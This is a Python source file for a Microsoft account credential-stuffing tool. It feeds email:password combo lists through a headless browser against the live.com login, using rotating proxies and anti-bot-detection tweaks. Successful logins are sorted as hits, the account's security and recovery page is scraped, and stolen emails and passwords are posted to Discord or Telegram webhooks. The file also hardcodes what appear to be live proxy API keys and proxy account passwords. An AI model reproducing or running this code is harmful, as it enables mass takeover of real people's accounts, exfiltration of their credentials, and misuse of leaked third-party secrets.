# ==========================================================
# FILE: engine_core.py
# VERSION: v1.2 — Microsoft Account Sentinel Engine (Fully Wired)
# DESCRIPTION: Async Playwright-based Microsoft login checker.
#              Webshare + Oxylabs proxy integration.
#              Fully wired with disposable filtering, Geo-IP mapping,
#              recovery info extraction, and webhook dispatching.
# ==========================================================

import asyncio
import random
import time
import requests
from datetime import datetime
from playwright.async_api import async_playwright, TimeoutError as PWTimeout

# ─── CREDENTIALS ──────────────────────────────────────────
WEBSHARE_KEYS = [
    "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",
    "z6rhxx6390l1kitf5zjptukkjbjielb56mwqr741",
    "a0afl99r624zz7fs8fh5y1ck5f9a0me3kajz5xtn",
    "5gtgl0pheucjczwxjjwzh1u7edgs65dp4cyfbcl3",
    "dqibfb8n2kkp7w0sku8gielshqqv4lcq6vuzdltb",
    "mpb64af9rak5931lfvmoozs9hsepeovj59ggrufz",
    "0hnwlw0e590d0yo9odtr411p4rw85uqv3oenc0ej",
    "3enappszm6k7p4tm5czf9as9d3g95jgasbuuvcr8",
    "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3",
]

OXYLABS_PROXIES = [
    "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",
    "user-Positivekenny_ls8CB-country-US:Adejoke52_52@dc.oxylabs.io:8000",
]

# ─── DISPOSABLE DOMAINS BLACKLIST ─────────────────────────
DISPOSABLE_DOMAINS = {
    "mailinator.com", "guerrillamail.com", "tempmail.com", "10minutemail.com",
    "trashmail.com", "getnada.com", "dispostable.com", "sharklasers.com",
    "yopmail.com", "temp-mail.org", "maildrop.cc", "mohmal.com"
}

# ─── RESULT STATUS CODES ──────────────────────────────────
STATUS_HIT          = "HIT"
STATUS_BAD_PASS     = "BAD_PASSWORD"
STATUS_LOCKED       = "LOCKED"
STATUS_NOT_EXIST    = "NOT_EXIST"
STATUS_CAPTCHA      = "CAPTCHA"
STATUS_2FA          = "2FA_REQUIRED"
STATUS_RATE_LIMITED = "RATE_LIMITED"
STATUS_ERROR        = "ERROR"
STATUS_TIMEOUT      = "TIMEOUT"

# ─── DEVICE POOL ─────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

VIEWPORTS = [
    {"width": 1920, "height": 1080},
    {"width": 1366, "height": 768},
    {"width": 1440, "height": 900},
    {"width": 1536, "height": 864},
]

# ─── ENGINE CONTROLLER (Pause / Stop State) ───────────────
class EngineController:
    """Thread-safe controller flags for pausing, resuming, or stopping the engine."""
    def __init__(self):
        self.is_paused = False
        self.is_stopped = False

    def pause(self):
        self.is_paused = True

    def resume(self):
        self.is_paused = False

    def stop(self):
        self.is_stopped = True
        self.is_paused = False


# ──────────────────────────────────────────────────────────
# PROXY PROTOCOL & GEO-MAPPING HELPERS
# ──────────────────────────────────────────────────────────
def _fetch_webshare_key(api_key: str, protocol: str = "http") -> list[str]:
    out = []
    try:
        headers = {"Authorization": f"Token {api_key.strip()}"}
        page = 1
        while page <= 25:
            url = f"https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page={page}&page_size=100"
            r = requests.get(url, headers=headers, timeout=20)
            if r.status_code != 200:
                break
            data = r.json()
            for it in data.get("results", []):
                try:
                    line = f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}"
                    out.append(f"{protocol.lower()}://{line}")
                except (KeyError, TypeError):
                    continue
            if not data.get("next"):
                break
            page += 1
    except Exception:
        pass
    return out


def get_live_proxy_pool(protocol: str = "http") -> list[str]:
    all_proxies = []
    for key in WEBSHARE_KEYS:
        all_proxies.extend(_fetch_webshare_key(key, protocol))
    for ox in OXYLABS_PROXIES:
        all_proxies.append(f"{protocol.lower()}://{ox}")
    return list(dict.fromkeys(all_proxies))


async def map_geo_nodes(proxy_list: list[str]) -> list[dict]:
    """Maps real IP, country, and lat/lon for proxies using ip-api.com."""
    mapped = []
    loop = asyncio.get_event_loop()
    
    async def _test_geo(proxy: str):
        try:
            res = await loop.run_in_executor(
                None,
                lambda: requests.get(
                    "http://ip-api.com/json/",
                    proxies={"http": proxy, "https": proxy},
                    timeout=6,
                )
            )
            if res.status_code == 200:
                d = res.json()
                if d.get("status") == "success":
                    return {
                        "proxy": proxy,
                        "ip": d.get("query"),
                        "country": d.get("country"),
                        "city": d.get("city"),
                        "lat": d.get("lat"),
                        "lon": d.get("lon"),
                        "status": "Mapped"
                    }
        except Exception:
            pass
        return {"proxy": proxy, "status": "Failed Geo Lookup"}

    tasks = [_test_geo(p) for p in proxy_list[:50]]  # Cap initial map batch
    results = await asyncio.gather(*tasks)
    return [r for r in results if r.get("status") == "Mapped"]


async def _test_single_proxy(proxy: str, timeout: int = 7) -> dict:
    start = time.time()
    try:
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None,
            lambda: requests.get(
                "https://api.ipify.org?format=json",
                proxies={"http": proxy, "https": proxy},
                timeout=timeout,
            )
        )
        latency = int((time.time() - start) * 1000)
        if result.status_code == 200:
            return {"proxy": proxy, "status": "Active", "latency": f"{latency}ms", "alive": True}
        return {"proxy": proxy, "status": "Dead", "latency": "N/A", "alive": False}
    except Exception:
        return {"proxy": proxy, "status": "Dead", "latency": "N/A", "alive": False}


async def batch_test_proxies(proxy_list: list[str], timeout: int = 7) -> list[dict]:
    tasks = [_test_single_proxy(p, timeout) for p in proxy_list]
    return await asyncio.gather(*tasks)


# ──────────────────────────────────────────────────────────
# WEBHOOK DISPATCHER (Discord / Telegram)
# ──────────────────────────────────────────────────────────
def dispatch_webhook(webhook_url: str, hit_data: dict, platform: str = "discord"):
    """Dispatches real-time notifications to Discord or Telegram on a HIT."""
    try:
        if not webhook_url:
            return
        email = hit_data.get("email")
        password = hit_data.get("password")
        notes = hit_data.get("notes")
        
        if platform.lower() == "discord":
            payload = {
                "embeds": [{
                    "title": "🚨 Microsoft Account HIT!",
                    "color": 65280,
                    "fields": [
                        {"name": "Email", "value": f"`{email}`", "inline": False},
                        {"name": "Password", "value": f"`{password}`", "inline": False},
                        {"name": "Details", "value": notes, "inline": False},
                        {"name": "Timestamp", "value": datetime.now().isoformat(), "inline": False}
                    ]
                }]
            }
            requests.post(webhook_url, json=payload, timeout=5)
        elif platform.lower() == "telegram":
            text = f"🚨 *Microsoft Account HIT!*\n\n📧 Email: `{email}`\n🔑 Pass: `{password}`\n📝 Notes: {notes}"
            requests.post(webhook_url, json={"chat_id": "@channel", "text": text, "parse_mode": "Markdown"}, timeout=5)
    except Exception:
        pass


# ──────────────────────────────────────────────────────────
# MICROSOFT LOGIN CHECKER — CORE
# ──────────────────────────────────────────────────────────
async def _check_single_account(
    email:            str,
    password:         str,
    proxy:            str | None,
    timeout:          int,
    stealth:          bool,
    force_en_us:      bool,
    block_webauthn:   bool,
    warm_up:          bool,
    auto_kmsi:        bool,
    typing_speed:     int,
    mouse_delay:      int = 0,
    keep_alive_js:    bool = False,
    extract_recovery: bool = False,
) -> dict:
    result = {
        "email":          email,
        "password":       password,
        "status":         STATUS_ERROR,
        "proxy":          proxy or "direct",
        "timestamp":      datetime.now().isoformat(),
        "notes":          "",
        "recovery_info":  None,
    }

    proxy_config = {"server": proxy} if proxy else None
    ua = random.choice(USER_AGENTS)
    viewport = random.choice(VIEWPORTS)

    try:
        async with async_playwright() as p:
            launch_args = [
                "--no-sandbox",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
            ]
            if block_webauthn:
                launch_args.append("--disable-features=WebAuthentication")

            browser = await p.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=launch_args,
            )

            context = await browser.new_context(
                user_agent=ua,
                viewport=viewport,
                locale="en-US" if force_en_us else None,
                java_script_enabled=True,
            )

            if stealth:
                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3]});
                    window.chrome = {runtime: {}};
                """)

            page = await context.new_page()
            page.set_default_timeout(timeout * 1000)

            if warm_up:
                try:
                    await page.goto("https://www.bing.com/", timeout=10000)
                    await asyncio.sleep(random.uniform(0.8, 1.5))
                except Exception:
                    pass

            await page.goto(
                "https://login.live.com/login.srf?wa=wsignin1.0",
                wait_until="domcontentloaded",
                timeout=timeout * 1000,
            )

            if mouse_delay > 0:
                await page.mouse.move(random.randint(100, 500), random.randint(100, 500))
                await asyncio.sleep(mouse_delay / 1000.0)

            try:
                await page.wait_for_selector("input[type='email']", timeout=8000)
            except PWTimeout:
                result["status"] = STATUS_ERROR
                result["notes"] = "Email field did not appear"
                await browser.close()
                return result

            await page.type("input[type='email']", email, delay=max(20, typing_speed))
            await asyncio.sleep(random.uniform(0.3, 0.7))
            await page.click("#idSIButton9")

            try:
                await page.wait_for_selector("#usernameError, [data-bind*='accountDoesNotExist']", timeout=4000)
                result["status"] = STATUS_NOT_EXIST
                await browser.close()
                return result
            except PWTimeout:
                pass

            try:
                await page.wait_for_selector("input[type='password']", timeout=8000)
            except PWTimeout:
                if await page.query_selector("iframe[src*='captcha'], #captchaContainer"):
                    result["status"] = STATUS_CAPTCHA
                    result["notes"] = "CAPTCHA before password field"
                else:
                    result["status"] = STATUS_ERROR
                    result["notes"] = "Password field did not appear"
                await browser.close()
                return result

            if keep_alive_js:
                await page.evaluate("setInterval(() => { window.dispatchEvent(new Event('mousemove')); }, 5000);")

            await page.type("input[type='password']", password, delay=max(20, typing_speed))
            await asyncio.sleep(random.uniform(0.3, 0.6))
            await page.click("#idSIButton9")

            await asyncio.sleep(2.5)
            current_url = page.url
            page_content = await page.content()

            if "captcha" in current_url.lower() or await page.query_selector("iframe[src*='captcha'], #captchaContainer"):
                result["status"] = STATUS_CAPTCHA
                result["notes"] = "CAPTCHA checkpoint triggered"
                await browser.close()
                return result

            if "tooManyRequests" in current_url or "429" in page_content[:500]:
                result["status"] = STATUS_RATE_LIMITED
                result["notes"] = "Rate limited by Microsoft"
                await browser.close()
                return result

            if "accountblocked" in current_url.lower() or await page.query_selector("#aadTile, [data-bind*='accountBlocked']") or "locked" in page_content.lower():
                result["status"] = STATUS_LOCKED
                result["notes"] = "Account locked or blocked"
                await browser.close()
                return result

            pw_error = await page.query_selector("#passwordError, [data-bind*='wrongPassword']")
            if pw_error:
                result["status"] = STATUS_BAD_PASS
                result["notes"] = (await pw_error.inner_text()).strip()
                await browser.close()
                return result

            if "proofup" in current_url.lower() or "verify" in current_url.lower() or await page.query_selector("#idDiv_SAOTCC_Title"):
                result["status"] = STATUS_2FA
                result["notes"] = "2FA / verification required"
                if auto_kmsi:
                    try:
                        await page.click("#idSIButton9")
                    except Exception:
                        pass
                await browser.close()
                return result

            if any(domain in current_url for domain in ["account.microsoft.com", "outlook.live.com", "onedrive.live.com"]):
                result["status"] = STATUS_HIT
                result["notes"] = f"Authenticated — {current_url[:80]}"
                
                # Extract recovery info if requested
                if extract_recovery:
                    try:
                        await page.goto("https://account.microsoft.com/security", timeout=10000)
                        await asyncio.sleep(2)
                        sec_text = await page.inner_text("body")
                        result["recovery_info"] = sec_text[:300]  # snippet of security settings
                    except Exception:
                        result["recovery_info"] = "Extraction failed"

                await browser.close()
                return result

            if "login.live.com" in current_url:
                result["status"] = STATUS_BAD_PASS
                result["notes"] = "Still on login page after submit"
                await browser.close()
                return result

            result["status"] = STATUS_ERROR
            result["notes"] = f"Unknown URL: {current_url[:100]}"
            await browser.close()
            return result

    except PWTimeout:
        result["status"] = STATUS_TIMEOUT
        result["notes"] = f"Timed out after {timeout}s"
        return result
    except Exception as e:
        result["status"] = STATUS_ERROR
        result["notes"] = str(e)[:120]
        return result


# ──────────────────────────────────────────────────────────
# BATCH CHECKER WITH FULL CONFIG & SETTINGS INTEGRATION
# ──────────────────────────────────────────────────────────
async def batch_check_accounts(
    combo_list:         list[str],
    proxy_list:         list[str] | None = None,
    timeout:            int = 25,
    max_concurrent:     int = 10,
    stealth:            bool = True,
    force_en_us:        bool = True,
    block_webauthn:     bool = True,
    warm_up:            bool = True,
    auto_kmsi:          bool = True,
    typing_speed:       int = 50,
    mouse_delay:        int = 0,
    keep_alive_js:      bool = False,
    fire_up_on_fail:    bool = False,
    soft_backoff:       bool = True,
    filter_disposable:  bool = False,
    extract_recovery:   bool = False,
    delay_between:      int = 2,
    rotation:           str = "Sticky Session (Per Account)",
    controller:         EngineController | None = None,
    webhook_url:        str | None = None,
    webhook_platform:   str = "discord",
    log_callback=None,
) -> list[dict]:
    
    # Filter disposable domains if enabled
    if filter_disposable:
        filtered_combos = []
        for c in combo_list:
            if ":" in c:
                domain = c.split(":")[0].split("@")[-1].strip().lower()
                if domain not in DISPOSABLE_DOMAINS:
                    filtered_combos.append(c)
        combo_list = filtered_combos

    semaphore = asyncio.Semaphore(max_concurrent)
    sticky_map: dict[str, str | None] = {}
    rr_cursor = 0

    def get_proxy(email: str) -> str | None:
        nonlocal rr_cursor
        if not proxy_list:
            return None
        if rotation == "Sticky Session (Per Account)":
            if email not in sticky_map:
                sticky_map[email] = proxy_list[rr_cursor % len(proxy_list)]
                rr_cursor += 1
            return sticky_map[email]
        elif rotation == "Round-Robin (Per Request)":
            p = proxy_list[rr_cursor % len(proxy_list)]
            rr_cursor += 1
            return p
        return proxy_list[0]

    def _log(msg: str):
        if log_callback:
            log_callback(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    async def _worker(combo: str, idx: int, total: int) -> dict | None:
        if controller:
            while controller.is_paused and not controller.is_stopped:
                await asyncio.sleep(0.5)
            if controller.is_stopped:
                return None

        if ":" not in combo:
            return {"email": combo, "password": "", "status": STATUS_ERROR, "notes": "Bad combo format", "proxy": "none", "timestamp": datetime.now().isoformat()}

        parts = combo.split(":", 1)
        email, password = parts[0].strip(), parts[1].strip()
        proxy = get_proxy(email)

        _log(f"[{idx}/{total}] Checking {email} via {(proxy or 'direct').split('@')[-1][:30]}")

        async with semaphore:
            res = await _check_single_account(
                email=email, password=password, proxy=proxy, timeout=timeout,
                stealth=stealth, force_en_us=force_en_us, block_webauthn=block_webauthn,
                warm_up=warm_up, auto_kmsi=auto_kmsi, typing_speed=typing_speed,
                mouse_delay=mouse_delay, keep_alive_js=keep_alive_js, extract_recovery=extract_recovery
            )

            if fire_up_on_fail and res["status"] in [STATUS_TIMEOUT, STATUS_ERROR]:
                _log(f"[{idx}/{total}] Retry fresh context for {email}")
                await asyncio.sleep(1.0)
                res = await _check_single_account(
                    email=email, password=password, proxy=proxy, timeout=timeout,
                    stealth=stealth, force_en_us=force_en_us, block_webauthn=block_webauthn,
                    warm_up=warm_up, auto_kmsi=auto_kmsi, typing_speed=typing_speed,
                    mouse_delay=mouse_delay, keep_alive_js=keep_alive_js, extract_recovery=extract_recovery
                )

            if soft_backoff and res["status"] == STATUS_RATE_LIMITED:
                _log(f"[{idx}] Rate limited. Backing off for 10s...")
                await asyncio.sleep(10.0)

            _log(f"[{idx}/{total}] {email} → {res['status']} | {res.get('notes','')[:50]}")

            # Dispatch webhook if hit
            if res["status"] == STATUS_HIT and webhook_url:
                dispatch_webhook(webhook_url, res, webhook_platform)

            if delay_between > 0:
                await asyncio.sleep(delay_between)

            return res

    total = len(combo_list)
    tasks = [_worker(combo, i + 1, total) for i, combo in enumerate(combo_list)]
    results = await asyncio.gather(*tasks)
    return [r for r in results if r is not None]


# ──────────────────────────────────────────────────────────
# REPORT COMPILER
# ──────────────────────────────────────────────────────────
def compile_export_reports(results: list[dict]) -> dict:
    hits = [r for r in results if r["status"] == STATUS_HIT]
    bad_pass = [r for r in results if r["status"] == STATUS_BAD_PASS]
    not_exist = [r for r in results if r["status"] == STATUS_NOT_EXIST]
    locked = [r for r in results if r["status"] == STATUS_LOCKED]
    captcha = [r for r in results if r["status"] == STATUS_CAPTCHA]
    twofa = [r for r in results if r["status"] == STATUS_2FA]
    rate_limit = [r for r in results if r["status"] == STATUS_RATE_LIMITED]
    timeouts = [r for r in results if r["status"] == STATUS_TIMEOUT]
    errors = [r for r in results if r["status"] == STATUS_ERROR]

    return {
        "total_checked": len(results),
        "total_hits": len(hits),
        "total_bad_pass": len(bad_pass),
        "total_not_exist": len(not_exist),
        "total_locked": len(locked),
        "total_captcha": len(captcha),
        "total_2fa": len(twofa),
        "total_rate_limited": len(rate_limit),
        "total_timeouts": len(timeouts),
        "total_errors": len(errors),
        "total_checkpoints": len(captcha) + len(twofa) + len(locked),
        "hits_text": "\n".join(f"{r['email']}:{r['password']}" for r in hits),
        "checkpoints_text": "\n".join(f"{r['email']}:{r['password']} | {r['status']} | {r.get('notes','')}" for r in captcha + twofa + locked),
        "bad_pass_text": "\n".join(f"{r['email']}:{r['password']}" for r in bad_pass),
        "not_exist_text": "\n".join(r["email"] for r in not_exist),
        "errors_text": "\n".join(f"{r['email']} | {r['status']}" for r in errors + timeouts),
        "all_results": results,
        "hits_full": hits,
    }
